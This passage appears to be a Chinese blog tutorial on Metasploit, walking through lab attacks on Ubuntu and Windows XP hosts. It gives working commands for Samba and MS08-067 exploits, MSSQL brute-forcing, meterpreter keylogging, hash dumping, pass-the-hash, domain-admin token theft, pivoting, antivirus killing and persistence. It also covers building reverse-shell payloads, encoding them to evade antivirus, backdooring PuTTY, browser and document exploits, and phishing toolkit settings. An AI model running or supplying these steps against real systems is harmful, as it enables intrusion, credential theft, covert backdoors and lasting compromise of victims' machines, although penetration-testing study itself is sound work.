+<li><p>show options：各个模块正确运行所需的各种设置，当没有选择模块时，输入这个命令会显示所有的全局参数。可以修改全局参数中的LogLevel，输入back可以返回上一个状态。</p>
+<p>使用search 搜索想要查找的某个特定的渗透攻击、辅助或攻击荷载模块。</p>
+</li>
+<li><p>show payloads：msf 会将与当前模块兼容的攻击荷载显示出来，在针对基于windows操作系统的攻击中，攻击荷载可能只会返回目标主机的一个命令行界面，复杂的能够返回一个完整的图形操作界面，在主界面输入这个会返回所有的攻击荷载。使用set payload windows&#x2F;shell&#x2F;reverse_tcp 选择攻击模块。</p>
+</li>
+<li><p>show targets：渗透攻击模块通常可以列出受到漏洞影响目标系统的类型。</p>
+</li>
+<li><p>info：当show和search 提供的信息过于简短，可以选择info 命令加上模块的名字来显示次模块的详细信息、参数说明以及所有可用的目标操作系统。</p>
+</li>
+<li><p>set 和 unset ：msf 模块中的参数只有两个状态：已设置和未设置。有些参数会被标记为必填项（required），必须要经过手工设置处于启用状态。</p>
+</li>
+<li><p>setg 和 unsetg ：setg命令和unsetg命令能够对全局参数进行设置或清除。这样就不必每次遇到某个参数都要重新设置。</p>
+</li>
+<li><p>save：使用setg 命令对全局参数进行设置后，可以使用save命令将当前的设置值保存下来。下次依然存在。</p>
+</li>
+</ol>
+<h4 id="2-攻击一台Ubuntu-主机"><a href="#2-攻击一台Ubuntu-主机" class="headerlink" title="2. 攻击一台Ubuntu 主机"></a>2. 攻击一台Ubuntu 主机</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; nmap -sT -A -P0 192.168.33.132</span><br><span class="line">通过nmap扫描发现3个开放端口，80，139，445.而且告诉我们这台主机操作系统为Ubuntu，而且看见它正运行着Samba 3.x服务和附带PHP 5.2.1的Apache 2.2.3服务。</span><br><span class="line">search samba</span><br><span class="line">use linux/samba/lsa_transnames_heap</span><br><span class="line">set payload linux/x86/shell_bind_tcp</span><br><span class="line">set LPORT 8080</span><br><span class="line">set RHOST 192.168.33.132</span><br><span class="line">exploit</span><br><span class="line">这种类型的攻击称为堆溢出攻击，使用动态内存分配中的漏洞来触发攻击代码，这种攻击不是100%可靠的，可以多试几次。</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-全端口攻击荷载：暴力猜解目标开放的端口"><a href="#3-全端口攻击荷载：暴力猜解目标开放的端口" class="headerlink" title="3. 全端口攻击荷载：暴力猜解目标开放的端口"></a>3. 全端口攻击荷载：暴力猜解目标开放的端口</h4><p>当攻击目标内部设置了很严格的端口过滤时，msf 提供了一个专用的攻击荷载帮助我们找到开放的端口。下面使用这个攻击荷载，会尝试所有端口进行连接，直到找到成功连接的端口为止。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use windows/smb/ms08_067_netapi</span><br><span class="line">set LHOST 192.168.76.128</span><br><span class="line">set RHOST 192.168.76.130</span><br><span class="line">set TARGET 3</span><br><span class="line">search ports</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp_allports</span><br><span class="line">exploit -j</span><br><span class="line">sessions -l -v</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-资源文件"><a href="#4-资源文件" class="headerlink" title="4. 资源文件"></a>4. 资源文件</h4><p>资源文件是MSF终端内包含一系列自动化命令的脚本文件，这些文件实际上是一个可以在MSF终端中执行的命令列表，列表中的命令将顺序执行，减少测试时间。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/framework3/msf3/ echo version &gt; resource.rc</span><br><span class="line">/opt/framework3/msf3/ echo sounds &gt;&gt; resource.rc</span><br><span class="line">msfconsole -r resource.rc</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-Meterpreter"><a href="#0x03-Meterpreter" class="headerlink" title="0x03 Meterpreter"></a>0x03 Meterpreter</h3><p>Meterpreter 是Metasploit 框架的一个扩展模块，可以调用Metasploit 的一些功能，对系统进行更为深入的渗透，这些功能包括反追踪、纯内存工作模式、密码哈希值获取、特权提升、跳板攻击等等。</p>
+<h4 id="1-攻陷Windows-XP虚拟机"><a href="#1-攻陷Windows-XP虚拟机" class="headerlink" title="1. 攻陷Windows XP虚拟机"></a>1. 攻陷Windows XP虚拟机</h4><p>在纤细介绍Meterpreter的功能特性之前，我们必须首先攻陷一台系统并取得一个Meterpreter shell。</p>
+<ol>
+<li><p>使用Nmap 扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sT -A -P0 192.168.33.130</span><br><span class="line">通过端口扫描可以看到，开放了MSSQL，FTP,SMTP端口，这几个端口都可能存在可被利用的漏洞。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>攻击MSSQL</p>
+<p>我们将对MSSQL的1433端口进行攻击，尝试对MSSQL服务进行暴力破解以获取密码，MSSQL默认安装在TCP1433端口和UDP1434端口，新版本的MSSQL允许随机安装到TCP端口，可以用UDP端口来查询获取SQL服务的TCP动态端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sU 192.168.33.130 -p 1434</span><br></pre></td></tr></table></figure>
+
+<p>以MSSQL为目标，我们可以使用mssql_ping 模块来找出MSSQL 服务端口，并进行用户名与口令的猜测。MSSQL在初次安装的时候需要用户创建sa或系统管理员用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use scanner/mssql/mssql_ping</span><br><span class="line">set RHOSTS 192.168.33.1/24</span><br><span class="line">set THREADS 50</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>暴力破解MSSQL服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use scanner/mssql/mssql_login</span><br><span class="line">set PASS_FILE /pentest/exploits/fasttrack/bin/dict/dict/wordlist.txt</span><br><span class="line">set RHOSTS 192.168.33.130</span><br><span class="line">set THREADS 10</span><br><span class="line">set verbose false</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>xp_cmdshell</p>
+<p>以sa管理员账户权限允许MSSQL时，我们可以执行xp_cmdshell存储过程，该存储过程允许我们直接与底层操作系统进行交互并执行命令。xp_cmdshell是SQL Server中缺省装载的内建存储程序。所以一旦获取sa用户，就可以同时以管理员身份访问MSSQL和底层操作系统。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use windows/mssql/mssql_payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.33.129</span><br><span class="line">set LPORT 443</span><br><span class="line">set RHOST 192.168.33.130</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>成功的话会获取meterpreter shell。</p>
+</li>
+<li><p>Meterpreter 基本命令</p>
+<ol>
+<li><p>截屏    meterpreter &gt; screenshot</p>
+</li>
+<li><p>sysinfo  获取系统运行的平台</p>
+</li>
+</ol>
+</li>
+<li><p>获取键盘记录</p>
+</li>
+</ol>
+<p>要获取系统的密码，可以破解或攻击的方法，也可以远程主机上进行键盘记录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先获取目标系统正在运行的进程</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line">使用migrate命令将会话迁移至explorer.exe 的进程空间</span><br><span class="line">meterpreter &gt; migrate 1668</span><br><span class="line">之后启动keylog_recorder模块</span><br><span class="line">run post/windows/capture/keylog_recorder</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-挖掘用户名和密码"><a href="#2-挖掘用户名和密码" class="headerlink" title="2 挖掘用户名和密码"></a>2 挖掘用户名和密码</h4><p>使用Meterpreter来获取系统本地文件中的用户名和密码哈希值</p>
+<ol>
+<li><p>提取密码哈希值</p>
+<p>本次攻击使用Meterpreter 中的hashdump输入模块，来提取系统的用户名和密码哈希值，微软Windows系统存储哈希值的方式一般为LAN Manager(LM)、NTLAN Manager(NTLM)、或者NTLAN Manager v2(NTLMv2).</p>
+<p>在LM存储方式中，当用户首次输入密码或更改密码时，密码被转换为哈希值，由于哈希长度限制，将密码切分为7个字符一组的哈希值。以password123456的密码为例，哈希值以passwor和d123456的方式存储，所以攻击者只需要简单地破解7个字符一组的密码，而不是原始的14个字符。而NTLM的存储方式和密码长度无关，密码password123456将作为整体转换为哈希值存储。</p>
+<p>如下内容是我们提取的UID为500的Administrator用户账户的密码哈希值，</p>
+<p>Administrator:500:xxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxx:::</p>
+<p>第一个哈希是LM哈希值，第二个是NTLM哈希值。</p>
+</li>
+<li><p>使用Meterpreter 命令获取密码哈希值</p>
+<p>在目标机上重置一个复杂的密码。然后使用Meterpreter 重新获取目标系统上的用户名和密码哈希值，使用use priv命令，意味着运行在特权账号上。</p>
+<p>获取安全账号管理器（SAM）数据库，我们需要运行在System权限下，以绕过注册表的限制，获取受保护的存有Windows用户名和密码的SAM存储。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">meterpreter &gt; post/windows/gather/hashdump</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435xxxxxxxxxxxxxxxxxxx:b75989fxxxxxxxxxxxxxxxx:::</span><br><span class="line">以aad3b435开头的哈希值是一个空的或不存在的哈希值。是因为我们之前设置的密码长度超过14个字符，所以不会存储为LM值，只能存储为NTLM。</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="3-传递哈希值"><a href="#3-传递哈希值" class="headerlink" title="3 传递哈希值"></a>3 传递哈希值</h4><p>在上面的例子中我们已经获取到了管理员用户名和密码，但我们短时间破解不了，那么如何通过这个用户账号登录到更多的主机，入侵更多的系统呢。</p>
+<p>这里用到哈希值传递技术，有哈希值就够了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf&gt; use windows/smb/psexec</span><br><span class="line">set pAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.33.129</span><br><span class="line">set LPORT 443</span><br><span class="line">set RHOST 192.168.33.130</span><br><span class="line">set SMBPass aad3435xxxxxxxxxxxxx:xxxxxxxxxxxxxxxx</span><br><span class="line">exploit</span><br><span class="line">即可以获取Meterpreter会话。</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-权限提升"><a href="#4-权限提升" class="headerlink" title="4 权限提升"></a>4 权限提升</h4><p>现在我们获得了目标系统的访问权限，可以通过net user命令创建限制权限的普通用户账号，我们将示例讲解如何创建新的用户并对其权限进行提升。</p>
+<p>在目标机上输入以下命令</p>
+<p><code>net user bob password123 /add</code></p>
+<p>然后创建一个基于Meterpreter 的攻击荷载程序–payload.exe，复制到目标XP机上，并在bob用户账户下运行。使用攻击荷载生成器（msfpaload）来创建以普通windows可执行文件格式的Meterpreter攻击荷载程序payload.exe。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.33.129 LPORT=443 X &gt; payload.exe</span><br><span class="line">调用msfcli接口进行监听并等待连接。</span><br><span class="line">msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.33.129 LPORT=443 E</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">&gt; net user bob</span><br><span class="line">我们发现账户权限受限，查询完毕后，按CTRL-Z键退出shell并保留merterpreter 会话。</span><br></pre></td></tr></table></figure>
+
+<p>现在我们来获取管理员权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; use priv</span><br><span class="line">meterpreter&gt; getsystem</span><br><span class="line">meterpreter&gt; getuid</span><br><span class="line">我们可以使用rev2setf命令，切换回Meterpreter shell会话中的初始用户账户。</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-令牌假冒"><a href="#5-令牌假冒" class="headerlink" title="5 令牌假冒"></a>5 令牌假冒</h4><p>我们将攫取目标系统中的一个Kerberos令牌，将其用在身份认证环节，来假冒当初创建这个令牌的用户。</p>
+<h4 id="6-使用-ps"><a href="#6-使用-ps" class="headerlink" title="6 使用 ps"></a>6 使用 ps</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; ps</span><br><span class="line"></span><br><span class="line">PID Name    Arch  Session  User      Path</span><br><span class="line">380  cmd.exe  x86     0    SNWAKS.IN\ihazdomainadmin           \System\</span><br><span class="line">会列出当前运行的应用程序以及运行这些的用户账户，我们所在域的名字是SNEAKS.IN，域管理用户名为ihazdomainadmin</span><br></pre></td></tr></table></figure>
+
+<p>使用steal_token命令和PID参数来盗取域管理员用户的令牌</p>
+<p><code>meterpreter &gt; steal_token 380</code></p>
+<p>现在已经成功假冒了域管理员账号，现在meterpreter是以域管理员用户来运行了。</p>
+<p>某些情况下ps命令不能列出域管理员运行的进程，我们可以使用incognito命令列举出系统上可以利用的令牌。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use incognito</span><br><span class="line">通过list_tokens -u 命令列举出令牌</span><br><span class="line">&gt; list_tokens -u</span><br><span class="line">扮演ihazdomainadmin令牌并添加一个新用户，然后给它域管理员权限</span><br><span class="line">meterpreter &gt; impersonate_token SNEAKS.IN\\ihazdomainadmin</span><br><span class="line">meterpreter &gt; add_user omgcompromised p@55w0rd! -h 192.168.33.50</span><br><span class="line">meterpreter &gt; add_group_user &quot;Domain Admins&quot; omgcompromised -h 192.168.33.50</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-通过跳板"><a href="#7-通过跳板" class="headerlink" title="7 通过跳板"></a>7 通过跳板</h4><p>跳板攻击（Pivoting）是msf 提供的一种攻击方法，允许从msf 终端攻击网络中的其他系统。可以任意利用这台机器作为跳板攻击网络中的其他系统，或者访问由于路由问题而不能直接访问的内网系统。</p>
+<p>实例：我们尝试对windows xp机器进行漏洞攻击，成功后以此为据点，再对内部网络的一个Ubuntu系统进行攻击，攻击机的IP是10.10.1.1&#x2F;24中的地址，目标是192.168.33.1&#x2F;24的网络。</p>
+<p>我们假设已经获得某个服务器的访问权限，我们使用scripts&#x2F;meterpreter&#x2F;目录中的Meterpreter外部脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先通过run get_local_subnets命令，在meterpreter会话中展示受控系统上本地子网</span><br><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line">将攻击会话放到后台运行</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">在MSF终端中执行添加路由命令，告知系统将远程网络ID(即受控主机的本地网络)通过攻击会话1来进行路由</span><br><span class="line">msf exploit(handler)&gt; route add 192.168.33.0 255.255.255.0 1</span><br><span class="line">通过 route print 命令显示当前活跃的路由设置</span><br><span class="line">msf exploit(handler)&gt; route print</span><br><span class="line">然后对目标linux系统进行第二次渗透攻击，这里使用的是基于Samba的堆溢出漏洞攻击，这个漏洞存在于我们的Metasploitable靶机上</span><br><span class="line">use linux/samba/lsa_transnames_heap</span><br><span class="line">set payload linux/x86/shell/reverse_tcp</span><br><span class="line">set LHOST 10.10.1.129</span><br><span class="line">set LPORT 8080</span><br><span class="line">set RHOST 192.168.33.132</span><br><span class="line">ifconfig</span><br><span class="line">exploit</span><br><span class="line">这种情况下，如果堆溢出成功，将会得到一个来自192.168.33.132是反弹终端。如果希望进一步对内网进行跳板扫描，可以使用metasploit内建的scanner/portscan/tcp 扫描模块，该模块能够通过metasploit来使用已建立的路由通道。</span><br><span class="line">在先前的例子中，我们在入侵系统后使用route add命令为meterpreter 的攻击会话添加路由，如果要更加自动化地完成这一操作，我们选择使用 load auto_add_route命令。</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; load auto_add_route</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-使用Meterpreter脚本"><a href="#8-使用Meterpreter脚本" class="headerlink" title="8 使用Meterpreter脚本"></a>8 使用Meterpreter脚本</h4><p>Meterpreter的扩展脚本可以在Meterpreter终端里帮助你进行系统查点，或完成事先定义好的任务。只介绍几个重要的。</p>
+<p>通过 run 脚本名字 命令，可以运行扩展脚本。</p>
+<p>比如你希望在受控系统上运行一个交互式的远程图形化工具，可以使用VNC协议将受控系统的桌面通信通过隧道方式映射过来，使得访问到远程的图形化桌面，使用 run vnc 命令，在远程系统上安装VNC会话，然后可以运行screen_unlock 命令对目标机器上的桌面进行解锁，就可以看到VNC窗口。</p>
+<ol>
+<li><p>迁移进程</p>
+<p>当我们攻击系统时，常常是对IE之类的服务进行漏洞利用，如果目标关闭了浏览器，Meterpreter 会话也将随之被关闭，为了避免这个问题，我们可以迁移进程到内存其他稳定的、不会被关闭的服务进程中</p>
+<p><code>meterpreter &gt; run post/windows/manage/migrate</code></p>
+</li>
+<li><p>关闭杀毒软件</p>
+<p><code>meterpreter &gt; run killav</code>停止相关进程</p>
+</li>
+<li><p>获取系统密码哈希值</p>
+<p><code>meterpreter &gt; run hashdump</code></p>
+</li>
+<li><p>查看目标机上的所有流量</p>
+<p><code>meterpreter &gt; run packetrecorder -i 1</code> 运行数据包记录脚本，所有被捕获的包都以.pcap的文件格式存储下来，并能够被wireshark等工具解析。</p>
+</li>
+<li><p>攫取系统信息</p>
+<p>Scraper 脚本可以列举出你想从系统得到的任何信息，可以攫取用户名和密码、下载全部注册表、挖掘密码哈希值、收集系统信息及输出 HKEY_CURRENT_USER(HKCU)</p>
+<p><code>meterpreter &gt; run scraper</code></p>
+</li>
+<li><p>控制持久化</p>
+<p>meterpreter的persistence 脚本允许注入Meterpreter代理，以确保系统重启后Meterpreter 还能运行。如果是反弹连接方式，可以设置连接攻击机的时间间隔，如果是绑定方式，可以设置在指定时间绑定开放端口。</p>
+<p>如下，我们运行persistence脚本让系统开机自启动Meterpreter(-X), 50秒（-i 50 ）重连一次，使用443端口，然后使用use multi&#x2F;handler命令进行监听，在设置了一大堆参数之后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run persistence -X -i 50 -p 443 -r 192.168.33.129</span><br><span class="line">msf &gt; use multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LPORT 443</span><br><span class="line">set LHOST 192.168.33.129</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="9-向后渗透攻击模块转变"><a href="#9-向后渗透攻击模块转变" class="headerlink" title="9 向后渗透攻击模块转变"></a>9 向后渗透攻击模块转变</h4><p>meterpreter &gt; run post&#x2F;    列举所有的后渗透攻击模块，输入后按tab键。</p>
+<h4 id="10-将命令行shell升级为Meterpreter"><a href="#10-将命令行shell升级为Meterpreter" class="headerlink" title="10 将命令行shell升级为Meterpreter"></a>10 将命令行shell升级为Meterpreter</h4><p>msf框架的一个新功能是可以在系统被攻陷的时候使用sessions -u 命令将命令行shell升级为Meterpreter。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use windows/smb/ms08_067_netapi</span><br><span class="line">set PAYLOAD windows/shell/reverse_tcp</span><br><span class="line">set TARGET 3</span><br><span class="line">使用setg命令设置LHOST和LPORT参数，这在使用sessions -u 1命令升级为Meterpreter的时候是必需的。setg是设置全局变量。</span><br><span class="line">setg LHOST 192.168.33.129</span><br><span class="line">setg LPORT 8080</span><br><span class="line">exploit -z</span><br><span class="line">这个命令允许在成功攻击目标后暂时不使用控制会话进行交互。</span><br><span class="line">sessions -u 1</span><br><span class="line">sessions -i 2</span><br></pre></td></tr></table></figure>
+
+<h4 id="11-通过附加的Railgun-组件操作windows-API"><a href="#11-通过附加的Railgun-组件操作windows-API" class="headerlink" title="11 通过附加的Railgun 组件操作windows API"></a>11 通过附加的Railgun 组件操作windows API</h4><p>将Railgun 添加到metasplot框架，你可以通过meterpreter调用windows API，在下面的代码中，我们由Meterpreter 进入到一个交互式的Ruby shell(irb)。irb shell允许使用Ruby的语法与meterpreter直接交互。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; irb</span><br><span class="line">&gt;&gt;client.railgun.user32.MessageBoxA(0.&quot;hello&quot;,&quot;world&quot;, &quot;MB_OK&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-免杀技术"><a href="#0x04-免杀技术" class="headerlink" title="0x04 免杀技术"></a>0x04 免杀技术</h3><h4 id="1-使用MSF攻击荷载生成器创建可独立运行的二进制文件"><a href="#1-使用MSF攻击荷载生成器创建可独立运行的二进制文件" class="headerlink" title="1 使用MSF攻击荷载生成器创建可独立运行的二进制文件"></a>1 使用MSF攻击荷载生成器创建可独立运行的二进制文件</h4><p>我们先创建一个简单的反弹shell程序，它能够回连到攻击机，并弹出一个命令行shell，这里我们使用msfpayload 命令载入windows&#x2F;shell_reverse_tcp o 查看可用参数，再执行msfpayload命令，并附上生成WindowsPE文件所需要的各个参数</p>
+<p><code>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 X &gt;/var/www/payload1.exe</code>，但是从2015年开始，msf 取消了msfpayload 和msfencode 模块，集成到了msfvenom中，使用命令是：<code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 -f exe -o /var/www/payload1.exe</code>现在我们有了一个可执行文件，下面我们使用multi&#x2F;handler模块在MSF终端中启动一个监听器。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/shell_reverse_tcp</span><br><span class="line">set LHOST 192.168.1.101</span><br><span class="line">set LPORT 31337</span><br><span class="line">前期工作准备就绪</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-躲避杀软的检测"><a href="#2-躲避杀软的检测" class="headerlink" title="2 躲避杀软的检测"></a>2 躲避杀软的检测</h4><p>之前是需要用msfencode 来编码生成的可执行文件，但是现在集成到了msfvenom 中，可以使用<code>msfvenom -l encoders</code>来查看可以使用的编码格式。要使用的话使用以下命令，就是之前的命令加上一点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 -e x86/shikata_ga_nai -f exe -o /var/www/payload2.exe</span><br></pre></td></tr></table></figure>
+
+<p>这个shikata_ga_nai编码技术是多态的，每次生成的攻击荷载都不一样，可以多次编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们使用多次编码</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/shell_reverse_tcp -i 5 -b &#x27;\x00&#x27; LHOST=192.168.1.101 LPORT=31337 -e x86/shikata_ga_nai -f raw | msfvenom -a x86 --platform win -e x86/alpha_upper -i -f raw | msfvenom -a x86 --platform win -e x86/shikata_ga_nai -i -f raw | msfvenom -a x86 --platform win -i 5 -f exe -o test.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-隐秘地启动一个攻击荷载"><a href="#3-隐秘地启动一个攻击荷载" class="headerlink" title="3 隐秘地启动一个攻击荷载"></a>3 隐秘地启动一个攻击荷载</h4><p>当用户启动我们的后门文件时，要是什么都没发生，这可能会引起怀疑，为了避免被目标察觉，可以在启动攻击荷载的同时，让宿主程序也正常运行起来。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们下载windows环境下的SSH客户端PuTTY,然后使用-k选项处理PuTTY -k 选项会配置攻击荷载在一个独立的线程中启动，这样宿主程序在执行时不会受到影响。</span><br><span class="line">wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</span><br><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=8080 -x putty.exe -e x86/shikata_ga_nai -k -i 5 -o /var/www/putty_backdoor.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-加壳软件"><a href="#5-加壳软件" class="headerlink" title="5 加壳软件"></a>5 加壳软件</h4><p>加壳软件是一类能够对可执行文件进行加密压缩并将解压代码嵌入其中的工具。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们可以将木马加壳，先安装upx</span><br><span class="line">apt-get install upx</span><br><span class="line">upx -5 /var/www/payload3.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05-客户端渗透攻击"><a href="#0x05-客户端渗透攻击" class="headerlink" title="0x05 客户端渗透攻击"></a>0x05 客户端渗透攻击</h3><h4 id="1-基于浏览器的渗透攻击"><a href="#1-基于浏览器的渗透攻击" class="headerlink" title="1 基于浏览器的渗透攻击"></a>1 基于浏览器的渗透攻击</h4><p>在这一节中集中讨论Metasploit 框架中基于浏览器的渗透攻击。针对浏览器的渗透攻击区别于其他传统渗透攻击的最大不同在于shellcode的触发执行方式。传统方式中，攻击者的全部目标就是获取远程代码执行的机会，然后植入ige恶意的攻击荷载，然而在浏览器渗透攻击中，为了能够执行特殊构造的攻击荷载代码，通常利用一种被称为堆喷射（heap spraying）的漏洞利用技术。</p>
+<p>空指令（NOP）和空指令滑行区（NOPslide）。空指令是这样一类汇编指令：不做任何事，继续执行下一条指令。空指令滑行区是指内存中由很多条紧密相连的空指令所构成的一个指令区域。如果程序在执行过程中遇到一连串的空指令，那么他会顺序“滑过”这段空指令区域到指令块的末尾，去执行该块指令之后的下一条指令。在Intel x86架构中，一个空指令对应的操作码是90，经常以\x90的形式出现在渗透代码中。</p>
+<p>堆喷射技术是将空指令滑行区与shellcode组合成固定的形式，然后将他们重复填充到堆中，知道填满一大块内存空间。我们通常使用浏览器在执行Javascript脚本去申请大量内存，攻击者将空指令滑行区和紧随其后的shellcode填充大块的内存区域，当程序的执行流被改变后，程序将会随机跳转到内存中的某个地方，而这个内存地址往往已被空指令构成的滑行区覆盖，紧随其后的shellcode也会随之执行。</p>
+<h4 id="2-对IE浏览器的极光漏洞进行渗透利用"><a href="#2-对IE浏览器的极光漏洞进行渗透利用" class="headerlink" title="2 对IE浏览器的极光漏洞进行渗透利用"></a>2 对IE浏览器的极光漏洞进行渗透利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use windows/browser/ms10_002_aurora</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set SRVPORT 80</span><br><span class="line">set URIPATH /</span><br><span class="line">set LHOST 192.168.33.129</span><br><span class="line">set LPORT 443</span><br><span class="line">exploit -z</span><br><span class="line">首先SRVHOST的默认设置是0.0.0.0：这意味着将把web服务绑定在所有网卡接口上。参数SRVPORT的默认值是8080，这个端口是目标用户将要连接的端口，来触发相应的渗透攻击，我们用80端口来代替8080，参数URIPATH是用户需要访问触发漏洞的URL地址，我们将其设为 /</span><br><span class="line">我们设置完成之后，可以用windows XP虚拟机来访问http://&lt;攻击者的IP地址&gt;去连接攻击者构造的网站。</span><br><span class="line"></span><br><span class="line">set ReverseConnectRetries 10</span><br><span class="line">改变一个反弹式连接每次尝试连接的次数，将默认尝试连接的次数从5改成10</span><br><span class="line">set AutoRunScript migrate -f</span><br><span class="line">自动开一个新进程，并将自身迁移到该进程中</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-文件格式漏洞渗透攻击"><a href="#3-文件格式漏洞渗透攻击" class="headerlink" title="3 文件格式漏洞渗透攻击"></a>3 文件格式漏洞渗透攻击</h4><p>我们这次利用的安全漏洞编号是MS11_006，是在微软windows系统函数 CreateSizedDIBSECTION中存在的一个栈溢出漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use windows/fileformat/ms11_006_createsizeddibsection</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.32.128</span><br><span class="line">set LPORT 443</span><br><span class="line">exploit</span><br><span class="line">我们输出的文件是msf.doc ，诱导对方打开，在之前要设置监听</span><br><span class="line">use multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.32.128</span><br><span class="line">set LPORT 443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x06-Metasploit-辅助模块"><a href="#0x06-Metasploit-辅助模块" class="headerlink" title="0x06 Metasploit 辅助模块"></a>0x06 Metasploit 辅助模块</h3><p>可以在MSF终端中输入show auxiliary命令列出所有可用的辅助模块。</p>
+<h4 id="1-使用辅助模块"><a href="#1-使用辅助模块" class="headerlink" title="1 使用辅助模块"></a>1 使用辅助模块</h4><p>如果在对网络扫描后，除了发现一些web服务器别无所获，这时攻击面非常窄，这时候scanner&#x2F;http中的辅助模块非常有用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search scanner/http</span><br><span class="line">尝试找到一台启用了webDAV的服务器</span><br><span class="line">use scanner/http/webdav_scanner</span><br><span class="line">set RHOSTS 192.168.1.0/24,192.168.13.242.252</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x07-社会工程学工具包"><a href="#0x07-社会工程学工具包" class="headerlink" title="0x07 社会工程学工具包"></a>0x07 社会工程学工具包</h3><p>社会工程学工具包(SET)</p>
+<h4 id="1-配置SET工具包"><a href="#1-配置SET工具包" class="headerlink" title="1 配置SET工具包"></a>1 配置SET工具包</h4><p>WEBATTACK_EMAIL 是用来标识在Web攻击的同时是否进行邮件钓鱼攻击，这个标识选项默认是关闭的，这意味着你将配置在使用Web攻击向量时不支持邮件钓鱼。WEBATTACK_EMAIL&#x3D;ON</p>
+<p>java applrt 攻击是SET中支持的一种基于Web的攻击方式，使用自签名的java applet程序来欺骗目标系统的使用者，取得许可后运行。如果系统中安装了JDK，可以打开这个选项，并选择任意名字对applet进行签名。SELF_SIGNED_APPLET&#x3D;ON</p>
